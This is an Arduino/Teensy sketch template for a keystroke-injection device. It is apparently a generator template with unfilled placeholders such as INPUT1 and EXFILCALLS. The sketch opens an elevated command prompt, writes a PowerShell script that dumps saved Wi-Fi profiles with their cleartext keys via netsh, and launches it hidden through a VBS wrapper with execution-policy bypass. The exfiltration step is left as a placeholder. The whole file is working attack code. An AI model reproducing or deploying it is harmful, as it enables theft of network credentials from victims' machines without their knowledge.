#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  WLAN-Keys\" > %temp%\\wl.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\wl.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\wl.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\wl.ps1");
  Keyboard.println("echo $w = netsh wlan show profiles ^| Select-String -Pattern \"All User Profile\" ^| foreach {$_.ToString()} >> %temp%\\wl.ps1");
  Keyboard.println("echo $ed = $w ^| foreach {$_.Replace(\"    All User Profile     : \",$null)} >> %temp%\\wl.ps1");
  Keyboard.println("echo $pv = $ed ^| foreach {netsh wlan show profiles name=\"$_\" key=clear} >> %temp%\\wl.ps1");
  

  String fn = "wl";
  String fp;
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\wl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\wl.ps1\"),0,true >> %temp%\\wl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\wl.vbs");
  delay(1000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS
EXFILDEFS
